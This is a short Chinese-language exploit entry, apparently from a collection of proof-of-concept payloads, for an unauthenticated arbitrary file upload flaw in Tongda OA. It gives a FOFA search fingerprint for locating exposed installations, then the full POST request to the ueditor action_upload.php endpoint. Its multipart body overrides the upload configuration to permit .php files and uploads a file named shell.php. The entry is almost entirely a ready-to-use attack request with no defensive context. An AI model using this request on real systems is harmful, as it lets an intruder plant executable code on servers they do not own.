# 通达OAaction前台任意文件上传漏洞

- **系统**：通达OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`fofa：title="office Anywhere" && icon_hash="-759108386" && "2016"`
- **请求**：`POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="CONFIG[fileFieldName]"
filename
--00content0boundary00
Content-Disposition: form-data; name="CONFIG[fileMaxSize]"
10000
--00content0boundary00
Content-Disposition: form-data; name="CONFIG[filePathFormat]"
shell
--00content0boundary00
Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
.php
--00content0boundary00
Content-Disposition: form-data; name="mufile"
submit
--00content0boundary00
Content-Disposition: form-data; name="filename"; filename="shell.php"
<?php echo 123;?>
--00content0boundary00--
```
- **预期**：200　|　—